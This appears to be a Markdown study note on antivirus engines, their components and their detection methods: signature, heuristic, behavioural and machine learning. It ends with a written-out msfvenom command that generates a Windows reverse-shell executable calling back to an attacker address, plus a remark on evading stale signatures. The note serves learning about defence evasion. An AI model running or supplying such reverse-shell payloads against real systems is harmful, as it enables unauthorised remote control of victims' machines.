---
tags:
  - metasploit
  - msfvenom
---
Antivirus (AV): 
- prevent, detect, remove malicious software
- typically includes additional protections like IDS/IPS, firewall, website scanners, etc.

## AV engines and components

Modern AV is fueled by signature updates fetched from the vendor's signature database residing on the Internet. Those signature definitions are stored in the local AV signature database, which feeds the more specific engines.

Components:
- File engine
- Memory engine
- Network engine
- Disassembler
- Emulator/Sandbox
- Browser plugin
- Machine learning engine

Events are ranked as:
- Benign
- Malicious
- Unknown

## Detection methods

- Signature-based
	- a restricted-list technology
	- filesystem is scanned for known malware signatures
	- a signature can be a hash of the file itself or a set of multiple patterns, such as specific binary values and strings belonging to a specific malware
	- pitfall: changing a single bit of a file would change its hash completely, evading signature-based detection
- Heuristic-based
	- search for various patterns and program calls that are considered malicious
	- achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code
- Behavioural
	- dynamically analyzes the behavior of a binary file
	- achieved by executing the file in question in an emulated environment and searching for behaviors or actions that are considered malicious
- Machine learning
	- uses ML algorithms to detect unknown threats by collecting and analyzing additional metadata

### Example: Metasploit payload

> When generating Metasploit payloads, it is best practice run the latest version of Kali, as Metasploit gets frequently updated and may evade stale AV signatures.

Generate a TCP reverse shell payload:
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe`

The resulting payload is detected by many AV products on VirusTotal as malicious

